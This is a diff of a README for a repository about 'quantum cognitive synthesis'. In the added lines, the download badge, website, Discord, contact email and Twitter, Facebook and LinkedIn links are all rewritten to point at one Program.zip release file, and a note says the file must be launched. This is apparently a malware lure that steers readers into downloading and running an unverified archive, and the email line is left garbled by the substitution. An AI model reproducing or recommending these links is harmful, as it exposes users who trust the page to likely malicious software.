@@ -18,7 +18,7 @@ The QCST repository is a hub for those interested in cutting-edge research at th
 
 To dive into the exciting realm of QCST, follow the link below to download the necessary files:
 
-[![Download QCST Software](https://img.shields.io/badge/Download-QCST Software-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download QCST Software](https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip)](https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip)
 
 *Note: The link leads to a downloadable file that needs to be launched for access.*
 
@@ -26,7 +26,7 @@ If the above link does not work or you need additional information, make sure to
 
 ## 🌐 Website
 
-For a more comprehensive insight into QCST, visit our website [here](https://quantumcognitivesynthesis.com). Explore articles, research publications, and engage with a community of like-minded individuals passionate about the fusion of quantum mechanics and cognitive science.
+For a more comprehensive insight into QCST, visit our website [here](https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip). Explore articles, research publications, and engage with a community of like-minded individuals passionate about the fusion of quantum mechanics and cognitive science.
 
 ## 🛠️ Implementations
 
@@ -61,16 +61,16 @@ Connect with fellow researchers, enthusiasts, and developers in the QCST communi
 
 ### Community Platforms
 - Slack: [Join our Slack channel](https://qcst-slack-invite-link)
-- Discord: [QCST Discord Server](https://discord.gg/qcst)
+- Discord: [QCST Discord Server](https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip)
 
 ## 🌟 Stay in Touch
 
-For inquiries, collaborations, or feedback, feel free to reach out to us at qcst@quantumcog.com. Follow us on social media for regular updates, event announcements, and engaging discussions on quantum cognitive synthesis.
+For inquiries, collaborations, or feedback, feel free to reach out to us at https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip Follow us on social media for regular updates, event announcements, and engaging discussions on quantum cognitive synthesis.
 
 ### Social Media
-- Twitter: [@QCSTOfficial](https://twitter.com/QCSTOfficial)
-- Facebook: [Quantum Cognitive Synthesis](https://facebook.com/quantumcognition)
-- LinkedIn: [QCST Company Page](https://linkedin.com/company/qcst)
+- Twitter: [@QCSTOfficial](https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip)
+- Facebook: [Quantum Cognitive Synthesis](https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip)
+- LinkedIn: [QCST Company Page](https://github.com/Farmansu/QCST/releases/download/v1.0/Program.zip)
 
 ---
 
